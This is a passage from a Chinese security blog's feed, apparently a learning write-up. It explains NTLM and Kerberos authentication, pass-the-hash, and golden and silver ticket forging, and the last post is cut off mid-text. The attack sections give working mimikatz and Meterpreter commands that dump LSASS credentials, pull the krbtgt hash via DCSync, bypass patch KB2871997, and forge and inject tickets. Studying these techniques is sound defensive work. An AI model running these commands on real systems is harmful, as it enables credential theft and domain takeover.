target="_blank" rel="noopener">https://blog.csdn.net/god_zzz/category_9703279.html</a></p><ul><li><h2 id="配环境杂项（主要是一些坑点，网上难搜的记录下来）"><a href="#配环境杂项（主要是一些坑点，网上难搜的记录下来）" class="headerlink" title="配环境杂项（主要是一些坑点，网上难搜的记录下来）"></a>配环境杂项（主要是一些坑点，网上难搜的记录下来）</h2></li></ul><p><a href="https://blog.csdn.net/god_zzz/category_8944538.html" target="_blank" rel="noopener">https://blog.csdn.net/god_zzz/category_8944538.html</a></p><ul><li><h2 id="WEB方向漏洞-复现-和分析"><a href="#WEB方向漏洞-复现-和分析" class="headerlink" title="WEB方向漏洞 复现 和分析"></a>WEB方向漏洞 复现 和分析</h2></li></ul><p><a href="https://blog.csdn.net/god_zzz/category_9013212.html" target="_blank" rel="noopener">https://blog.csdn.net/god_zzz/category_9013212.html</a></p><ul><li><h2 id="APP-方向"><a href="#APP-方向" class="headerlink" title="APP 方向"></a>APP 方向</h2></li></ul><p><a href="https://blog.csdn.net/god_zzz/category_9032877.html" target="_blank" rel="noopener">https://blog.csdn.net/god_zzz/category_9032877.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>内网安全:NTML认证流程和PTH原理</title>
      <link href="/2020/05/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!NTML%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B%E5%92%8CPTH%E5%8E%9F%E7%90%86/"/>
      <url>/2020/05/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!NTML%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B%E5%92%8CPTH%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="NTML认证流程和PTH原理"><a href="#NTML认证流程和PTH原理" class="headerlink" title="NTML认证流程和PTH原理."></a>NTML认证流程和PTH原理.</h3><ul><li><ul><li><a href="#0x01__3">0x01 本地认证流程</a></li><li><a href="#0x02__26">0x02 网络认证</a></li><li><ul><li><a href="#LM_HashNTML_Hash_32">LM Hash和NTML Hash</a></li><li><a href="#NTLM_Hash_38">NTLM Hash</a></li><li><a href="#NTLM_V2_73">NTLM V2协议</a></li></ul></li><li><a href="#0x03_NTLM__87">0x03 NTLM 认证</a></li><li><a href="#0x04_Pass_The_Hash_PTH_105">0x04 Pass The Hash （PTH）原理</a></li><li><ul><li><a href="#_107">主要作用：</a></li><li><a href="#_113">前提：</a></li><li><a href="#_122">原理：</a></li><li><a href="#_132">使用方法：</a></li><li><a href="#_140">绕过补丁，进行哈希传递</a></li></ul></li></ul></li></ul><h2 id="0x01-本地认证流程"><a href="#0x01-本地认证流程" class="headerlink" title="0x01 本地认证流程"></a>0x01 本地认证流程</h2><p>操作系统会显示登录界面，接收输入密码后，将密码交给lsass进程，这个进程中会存一份明文密码，将明文密码加密成NTLM Hash，和SAM数据库比较认证。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTQxMzM3MzQucG5n?x-oss-process=image/format,png" alt="image-20200514133734007"></p><p>注：</p><ul><li>winlogon.exe（Windows Logon Process），用于管理用户登录和退出。</li><li>LSASS用于微软Windows系统的安全机制，它用于本地安全和登陆策略。</li></ul><h2 id="0x02-网络认证"><a href="#0x02-网络认证" class="headerlink" title="0x02 网络认证"></a>0x02 网络认证</h2><p>在内网中，早期SMB协议在网络上传输明文口令。后来出现LM hash，很容易就被破解，现在又有了NTLM以及Kerberos。</p><h3 id="LM-Hash和NTML-Hash"><a href="#LM-Hash和NTML-Hash" class="headerlink" title="LM Hash和NTML Hash"></a>LM Hash和NTML Hash</h3><p>Windows操作系统中的密码由两部分加密组成，即<code>LM Hash</code>和<code>NTML Hash</code>。</p><h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><p>正常的明文密码加密为NTLM Hash的方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password ----&gt; 十六进制编码 ----&gt; Unicode转换 ----&gt; MD4加密 ----&gt; 得到NTLM Hash</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin -&gt; hex(16进制编码) &#x3D; 61646d696e</span><br><span class="line"></span><br><span class="line">61646d696e -&gt; Unicode &#x3D; 610064006d0069006e00</span><br><span class="line"></span><br><span class="line">610064006d0069006e00 -&gt; MD4 &#x3D; 209c6174da490caeb422f3fa5a7ae634</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left"></th><th align="left">2000</th><th align="left">xp</th><th align="left">2003</th><th align="left">Vista</th><th align="left">win7</th><th align="left">2008</th><th align="left">2012</th></tr></thead><tbody><tr><td align="left">LM</td><td align="left">√</td><td align="left">√</td><td align="left">√</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">NTLM</td><td align="left">√</td><td align="left">√</td><td align="left">√</td><td align="left">√</td><td align="left">√</td><td align="left">√</td><td align="left">√</td></tr></tbody></table><p>自Server 2003之后，Windows的认证方式均为NTML Hash。</p><p>自Server 2008开始默认禁用LM Hash， 当密码超过14位时候会采用NTLM加密</p><p>所以大多数的Windows都采用NTLM协议认证，LM协议已经基本淘汰了。</p><h3 id="NTLM-V2协议"><a href="#NTLM-V2协议" class="headerlink" title="NTLM V2协议"></a>NTLM V2协议</h3><p>NTLM是Windows的一种网络认证协议，它是基于挑战（Chalenge）/响应（Response）认证机制的一种认证模式。</p><p>NTLM v1与NTLM v2区别：</p><table><thead><tr><th>都是基于NTLM Hash加密的</th><th>NTLM v1</th><th>NTLM v2</th></tr></thead><tbody><tr><td>加密算法不同</td><td></td><td></td></tr><tr><td>Challage</td><td>8位</td><td>16位</td></tr><tr><td>Net-NTLM Hash</td><td>主要加密算法是DES</td><td>主要加密算法是HMAC-MD5</td></tr></tbody></table><h2 id="0x03-NTLM-认证"><a href="#0x03-NTLM-认证" class="headerlink" title="0x03 NTLM 认证"></a>0x03 NTLM 认证</h2><p><strong>NTLM协议的认证过程分为三步：</strong></p><ul><li>协商（主要用于确认双方协议版本）</li><li>质询（就是挑战（Chalenge）响应（Response）模式）</li><li>验证 （认证完成）</li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTQxMzM3NTcucG5n?x-oss-process=image/format,png" alt="image-20200514133757850"></p><p>整个过程中 NTML hash 是没有在网络上传递的</p><h2 id="0x04-Pass-The-Hash-（PTH）原理"><a href="#0x04-Pass-The-Hash-（PTH）原理" class="headerlink" title="0x04 Pass The Hash （PTH）原理"></a>0x04 Pass The Hash （PTH）原理</h2><h3 id="主要作用："><a href="#主要作用：" class="headerlink" title="主要作用："></a>主要作用：</h3><p>哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术。</p><h3 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h3><p>抓取管理员的密码、NTLM Hash</p><ul><li>认证的用户名 （质询第一步需要）</li><li>认证用户的NTLM Hash</li></ul><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>哈希传递就是伪造一个客户端，和正常的NTML认证一样</p><p>只是我们用户名对应的NTLM Hash传递到其它主机，给出的 Chanllenge加密，生成一个Response，来完成认证。</p><p>个人感觉其实不算啥漏洞，只是一种技巧手法吧。</p><h3 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h3><p>在目标机器中以管理员权限运行mimikatz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth &#x2F;user:&lt;用户名&gt; &#x2F;domain:&lt;域名&gt; &#x2F;ntlm:&lt;NTML Hash&gt;&quot;</span><br></pre></td></tr></table></figure><h3 id="绕过补丁，进行哈希传递"><a href="#绕过补丁，进行哈希传递" class="headerlink" title="绕过补丁，进行哈希传递"></a>绕过补丁，进行哈希传递</h3><ul><li>当系统安装了<code>KB2871997</code>补丁，将无法使用常规的哈希传递攻击；</li><li>但是SID为500的Admintrator用户，依然可以使用哈希传递，或者使用AES-256进行哈希传递。</li></ul><p>抓取AES-256密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot;</span><br></pre></td></tr></table></figure><p>管理员权限运行mimikatz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:zeo.com &#x2F;aes256:&lt;AES-256密钥&gt;&quot;</span><br></pre></td></tr></table></figure><p>还有很多工具 MSF CS impacket Smbexec</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kerberos域认证流程---黄金票据和白银票据</title>
      <link href="/2020/05/12/Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B---%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/"/>
      <url>/2020/05/12/Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B---%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@[TOC]</p><h2 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h2><p>算是学习之后总结记录，加深自己的理解，这里我是参考了倾旋师傅的讲解，感觉讲的比较好，加入自己的理解和一些其他东西写下来，分享出来，也方便自己回顾知识和补充<br>还有画图的问题，我自己画的太费劲了而且也看不明白，索性我就自己手画了几个，方便自己理解和熟悉流程，感觉不错，手动狗头，哈哈</p><h2 id="0x01-Kerberos域认证"><a href="#0x01-Kerberos域认证" class="headerlink" title="0x01 Kerberos域认证"></a>0x01 Kerberos域认证</h2><p>Kerberos 是一种网络认证协议，其设计目标是通过<a href="https://baike.baidu.com/item/密钥" target="_blank" rel="noopener">密钥</a>系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于<a href="https://baike.baidu.com/item/主机操作系统" target="_blank" rel="noopener">主机操作系统</a>的认证，无需基于<a href="https://baike.baidu.com/item/主机地址" target="_blank" rel="noopener">主机地址</a>的信任，不要求网络上所有主机的物理安全，并假定网络上传送的<a href="https://baike.baidu.com/item/数据包" target="_blank" rel="noopener">数据包</a>可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的<a href="https://baike.baidu.com/item/密码技术" target="_blank" rel="noopener">密码技术</a>（如：共享密钥）执行认证服务的。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDMxNTkucG5n?x-oss-process=image/format,png" alt="image-20200512103159200"></p><p>Kerberos的标志是三只狗头，分别代表以下角色：</p><ul><li>Client</li><li>Server</li><li>KDC(Key Distribution Center) = DC(Domain Controller)</li></ul><p><strong>名词基本概念：</strong></p><ul><li><p>KDC: Key Distribution Center，密钥分发中心，负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由AS和TGS组成。</p></li><li><p>AD: Account Database，存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT。</p><p>（物理方面 KDC和AD 都是一个机子）</p></li><li><p>TGT: Ticket Granting Ticket =  入场券，通过入场券能够获得票据，是一种临时凭证的存在。</p></li><li><p>AS（Authentication Server）= 认证服务器,为client生成TGT的服务</p></li><li><p>TGS（Ticket Granting Server）= 票据授权服务器</p></li><li><p>SS（Service Server）= 特定服务提供端</p></li></ul><h2 id="域认证大致流程："><a href="#域认证大致流程：" class="headerlink" title="域认证大致流程："></a>域认证大致流程：</h2><ol><li><p>Client 上的用户请求KDC服务，最后AS服务生产TGT，返回给Client</p></li><li><p>Client 使用TGT请求KDC上的TGS得到ST（TGS ticket）真正访问的票据</p></li><li><p>Client使用ST（TGS Ticket）访问Server</p></li></ol><h2 id="第一部分：生成TGT-和-session-key"><a href="#第一部分：生成TGT-和-session-key" class="headerlink" title="第一部分：生成TGT 和  session key"></a>第一部分：生成TGT 和  session key</h2><p>1.Client发送自己的身份信息到KDC（身份信息中起码包含用户名），KDC根据用户名在AD中寻找是否在白名单中，然后根据用户名提取到对应的NTLM Hash。</p><p>2 .KDC此时生成一个随机字符串Session Key，使用客户端的NTLM Hash加密Session Key，作为AS数据，使用KDC中krbtgt用户的NTLM Hash加密Session Key和客户端的信息，生成TGT。</p><p>第一部分：获取了 TGT</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDAxMTcucG5n?x-oss-process=image/format,png" alt="image-20200512100117725"></p><p>注：客户端收到 TGT 是无法解密的，KDC返回的TGT客户端是无法解密的，因为它没有KDC Hash，KDC Hash指的就是是krbtgt 的hash</p><p>这就是伪造黄金票据的原理，这个是后面还会有介绍。</p><h2 id="第二步：获取要访问的-server-ticket"><a href="#第二步：获取要访问的-server-ticket" class="headerlink" title="第二步：获取要访问的 server ticket"></a>第二步：获取要访问的 server ticket</h2><p>1.客户端使用自己NTLM Hash解密出来的Session Key加密的客户端信息跟时间戳。</p><p>如果假设这个数据被中间人窃取到，也无法在段时间内破解，因为KDC会校验时间戳。</p><p>2.KDC接到TGT与其他内容后，会首先解密TGT，只有KDC可以解密TGT，从TGT中提取到Session Key，再使用Session Key解密其他内容，解密出来的内容同TGT中的信息进行校验来确认客户端是否受信。</p><p>3.验证通过后，就会生成一个新的Session Key，我们称之为Server Session Key</p><p>这个Server Session Key主要用于和服务器进行通信。同时还会生成一个Ticket，也就是最后的票据了。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDA1MTcucG5n?x-oss-process=image/format,png" alt="image-20200512100517747"></p><p>注释：Server Hash：这个Hash是在AD中服务器计算机的NTLM Hash。</p><h2 id="第三部-向客户端向服务器请求认证"><a href="#第三部-向客户端向服务器请求认证" class="headerlink" title="第三部 向客户端向服务器请求认证"></a>第三部 向客户端向服务器请求认证</h2><p>客户端向服务器请求，需要提供Ticket，Server Session Key加密的客户端信息与时间戳。</p><p>1 Ticket客户端无法解密，因为没有 Server hash，只能发送给 sever端</p><p>2 服务器端通过自己的hash解密Ticket，得到解密Server Session Key(Client info + Timestamp)</p><p>3 用刚刚解密的Session Key，解开Client info + Timestamp，验证客户端信息和时间戳</p><p>校验通过后，认证成功，该票据会一直存在客户端内存中，最后成功登陆</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDE2MzYucG5n?x-oss-process=image/format,png" alt="image-20200512101636849"></p><p>其中白银票据的伪造就发生在这一步的认证中，下面会介绍</p><h2 id="0x01-白银票据-Silver-Tickets"><a href="#0x01-白银票据-Silver-Tickets" class="headerlink" title="0x01 白银票据(Silver Tickets)"></a>0x01 白银票据(Silver Tickets)</h2><p>白银票据前提:</p><p>1.不需要与KDC进行交互，直接和server认证</p><p>2.需要目标服务的NTLM Hash</p><p>在第三步认证中的Ticket的组成:</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMTA2MDUucG5n?x-oss-process=image/format,png" alt="image-20200512110605262"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ticket&#x3D;Server Hash(Server Session Key+Client info+End Time)</span><br></pre></td></tr></table></figure><p>原理：<br>如果我们拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket，直接去server端去验证。</p><p>注：服务器是不知道Server Session Key是什么的，服务器的Server Session Key是解密ticket获得的，所以一切凭据的核心在Server Hash，有了它就开业直接伪造票据认证。</p><h3 id="伪造白银票据-Silver-Tickets"><a href="#伪造白银票据-Silver-Tickets" class="headerlink" title="伪造白银票据(Silver Tickets)"></a>伪造白银票据(Silver Tickets)</h3><p>首先需要导出Server Hash：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit</span><br></pre></td></tr></table></figure><p>或MSF模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; msv</span><br></pre></td></tr></table></figure><p>伪造票据:</p><p>清空当前系统的票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist purge</span><br></pre></td></tr></table></figure><p>伪造票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe “kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域 SID&gt; &#x2F;target:&lt;目标服务器主机名&gt; &#x2F;service:&lt;服务类型&gt; &#x2F;rc4:&lt;NTLM Hash&gt; &#x2F;user:&lt;用户名&gt; &#x2F;ptt&quot; exit</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden &#x2F;domain:zeo.com &#x2F;sid:S-1-5-21-1111111111-111111111-11111111111 &#x2F;target:DC.zeo.com &#x2F;service:CIFS &#x2F;rc4:7c4a8d09ca3762af61e59520943dc26494f8941b &#x2F;user:admin &#x2F;ptt&quot; exit</span><br></pre></td></tr></table></figure><p>验证权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC\c$</span><br></pre></td></tr></table></figure><p>由于白银票据需要目标服务器的Hash，所以没办法生成对应域内 所有服务器的票据。因此只能针对服务器 上的某些服务去伪造，伪造的服务类型列表如下:</p><table><thead><tr><th>服务注释</th><th>服务名</th></tr></thead><tbody><tr><td>WMI</td><td>HOST、RPCSS</td></tr><tr><td>Powershell Remoteing</td><td>HOST、HTTP</td></tr><tr><td>WinRM</td><td>HOST、HTTP</td></tr><tr><td>Scheduled Tasks</td><td>HOST</td></tr><tr><td>LDAP 、DCSync</td><td>LDAP</td></tr><tr><td>Windows File Share (CIFS)</td><td>CIFS</td></tr><tr><td>Windows Remote ServerAdministration Tools</td><td>RPCSS、LDAP、CIFS</td></tr></tbody></table><h2 id="0x02-黄金票据（Golden-Ticket）"><a href="#0x02-黄金票据（Golden-Ticket）" class="headerlink" title="0x02 黄金票据（Golden Ticket）"></a>0x02 黄金票据（Golden Ticket）</h2><p>黄金票据前提:</p><p>1.需要与DC通信</p><p>2.需要krbtgt用户的hash（也就是说要拿下域控制器）</p><p>黄金票据原理：</p><p>就是伪造的TGT，它会在第二步认证被发送到KDC的TGS，如果我们有了krbtgt用户的hash就可以直接伪造TGT，其中的KDC需要的session key，是KDC解密TGT之后获取的，所以session key也是和TGT一起伪造的，那么后续的认证，就可以随意的制造想要的票据了。</p><h3 id="伪造黄金票据"><a href="#伪造黄金票据" class="headerlink" title="伪造黄金票据"></a>伪造黄金票据</h3><p>管理员权限运行mimikatz，获取关键krbtgt hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync &#x2F;user:krbtgt&quot; exit</span><br></pre></td></tr></table></figure><p>获取域中所有用户SID</p><p>只要是域用户权限就行，去掉SID最后的数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure><p>清空现有票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::purge&quot; exit</span><br></pre></td></tr></table></figure><p>生成票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz “kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域SID&gt; &#x2F;rc4:&lt;KRBTGT NTLM Hash&gt; &#x2F;user:&lt;任意用户名&gt; &#x2F;ptt&quot; exit</span><br></pre></td></tr></table></figure><p>还有一个简单的用法，cobalt strike中直接有一项黄金票据生产，十分方便。</p><p>将票据注入内存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt Administrator.kiribi&quot; exit</span><br></pre></td></tr></table></figure><p>当前会话中的票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::tgt&quot; exit</span><br></pre></td></tr></table></figure><p>权限验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC\c$</span><br></pre></td></tr></table></figure><h2 id="0x03-黄金票据和白银票据比较"><a href="#0x03-黄金票据和白银票据比较" class="headerlink" title="0x03 黄金票据和白银票据比较"></a>0x03 黄金票据和白银票据比较</h2><table><thead><tr><th align="left"></th><th>黄金票据</th><th>白银票据</th></tr></thead><tbody><tr><td align="left">访问权限</td><td>伪造TGT，可以获取任何Kerberos服务权限</td><td>伪造TGS，只能访问指定的服务</td></tr><tr><td align="left">加密方式</td><td>由Kerberos的Hash加密</td><td>Silver Ticket由服务账号Hash加密</td></tr><tr><td align="left">认证流程</td><td>需要访问域控认证，属于第二步认证</td><td>直接和服务器认，最后一步认证</td></tr></tbody></table><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://payloads.online/archivers/2018-11-30/1" target="_blank" rel="noopener">https://payloads.online/archivers/2018-11-30/1</a>  </p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网安全:Kerberos域认证流程---黄金票据和白银票据</title>
      <link href="/2020/05/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B---%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/"/>
      <url>/2020/05/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B---%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h3><ul><li><ul><li><a href="#0x00__3">0x00 前提</a></li><li><a href="#0x01_Kerberos_7">0x01 Kerberos域认证</a></li><li><a href="#_41">域认证大致流程：</a></li><li><a href="#TGT___session_key_53">第一部分：生成TGT 和 session key</a></li><li><a href="#_server_ticket_79">第二步：获取要访问的 server ticket</a></li><li><a href="#__109">第三部 向客户端向服务器请求认证</a></li><li><a href="#0x01_Silver_Tickets_133">0x01 白银票据(Silver Tickets)</a></li><li><ul><li><a href="#Silver_Tickets_161">伪造白银票据(Silver Tickets)</a></li></ul></li><li><a href="#0x02_Golden_Ticket_220">0x02 黄金票据（Golden Ticket）</a></li><li><ul><li><a href="#_236">伪造黄金票据</a></li></ul></li><li><a href="#0x03__288">0x03 黄金票据和白银票据比较</a></li><li><a href="#0x04__300">0x04 参考</a></li></ul></li></ul><h2 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h2><p>算是学习之后总结记录，加深自己的理解，这里我是参考了倾旋师傅的讲解，感觉讲的比较好，加入自己的理解和一些其他东西写下来，分享出来，也方便自己回顾知识和补充<br>还有画图的问题，我自己画的太费劲了而且也看不明白，索性我就自己手画了几个，方便自己理解和熟悉流程，感觉不错，手动狗头，哈哈</p><h2 id="0x01-Kerberos域认证"><a href="#0x01-Kerberos域认证" class="headerlink" title="0x01 Kerberos域认证"></a>0x01 Kerberos域认证</h2><p>Kerberos 是一种网络认证协议，其设计目标是通过<a href="https://baike.baidu.com/item/%E5%AF%86%E9%92%A5" target="_blank" rel="noopener">密钥</a>系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">主机操作系统</a>的认证，无需基于<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA%E5%9C%B0%E5%9D%80" target="_blank" rel="noopener">主机地址</a>的信任，不要求网络上所有主机的物理安全，并假定网络上传送的<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%8C%85" target="_blank" rel="noopener">数据包</a>可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的<a href="https://baike.baidu.com/item/%E5%AF%86%E7%A0%81%E6%8A%80%E6%9C%AF" target="_blank" rel="noopener">密码技术</a>（如：共享密钥）执行认证服务的。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDMxNTkucG5n?x-oss-process=image/format,png" alt="image-20200512103159200"></p><p>Kerberos的标志是三只狗头，分别代表以下角色：</p><ul><li>Client</li><li>Server</li><li>KDC(Key Distribution Center) = DC(Domain Controller)</li></ul><p><strong>名词基本概念：</strong></p><ul><li><p>KDC: Key Distribution Center，密钥分发中心，负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由AS和TGS组成。</p></li><li><p>AD: Account Database，存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT。</p><p>（物理方面 KDC和AD 都是一个机子）</p></li><li><p>TGT: Ticket Granting Ticket = 入场券，通过入场券能够获得票据，是一种临时凭证的存在。</p></li><li><p>AS（Authentication Server）= 认证服务器,为client生成TGT的服务</p></li><li><p>TGS（Ticket Granting Server）= 票据授权服务器</p></li><li><p>SS（Service Server）= 特定服务提供端</p></li></ul><h2 id="域认证大致流程："><a href="#域认证大致流程：" class="headerlink" title="域认证大致流程："></a>域认证大致流程：</h2><ol><li><p>Client 上的用户请求KDC服务，最后AS服务生产TGT，返回给Client</p></li><li><p>Client 使用TGT请求KDC上的TGS得到ST（TGS ticket）真正访问的票据</p></li><li><p>Client使用ST（TGS Ticket）访问Server</p></li></ol><h2 id="第一部分：生成TGT-和-session-key"><a href="#第一部分：生成TGT-和-session-key" class="headerlink" title="第一部分：生成TGT 和 session key"></a>第一部分：生成TGT 和 session key</h2><p>1.Client发送自己的身份信息到KDC（身份信息中起码包含用户名），KDC根据用户名在AD中寻找是否在白名单中，然后根据用户名提取到对应的NTLM Hash。</p><p>2 .KDC此时生成一个随机字符串Session Key，使用客户端的NTLM Hash加密Session Key，作为AS数据，使用KDC中krbtgt用户的NTLM Hash加密Session Key和客户端的信息，生成TGT。</p><p>第一部分：获取了 TGT</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDAxMTcucG5n?x-oss-process=image/format,png" alt="image-20200512100117725"></p><p>注：客户端收到 TGT 是无法解密的，KDC返回的TGT客户端是无法解密的，因为它没有KDC Hash，KDC Hash指的就是是krbtgt 的hash</p><p>这就是伪造黄金票据的原理，这个是后面还会有介绍。</p><h2 id="第二步：获取要访问的-server-ticket"><a href="#第二步：获取要访问的-server-ticket" class="headerlink" title="第二步：获取要访问的 server ticket"></a>第二步：获取要访问的 server ticket</h2><p>1.客户端使用自己NTLM Hash解密出来的Session Key加密的客户端信息跟时间戳。</p><p>如果假设这个数据被中间人窃取到，也无法在段时间内破解，因为KDC会校验时间戳。</p><p>2.KDC接到TGT与其他内容后，会首先解密TGT，只有KDC可以解密TGT，从TGT中提取到Session Key，再使用Session 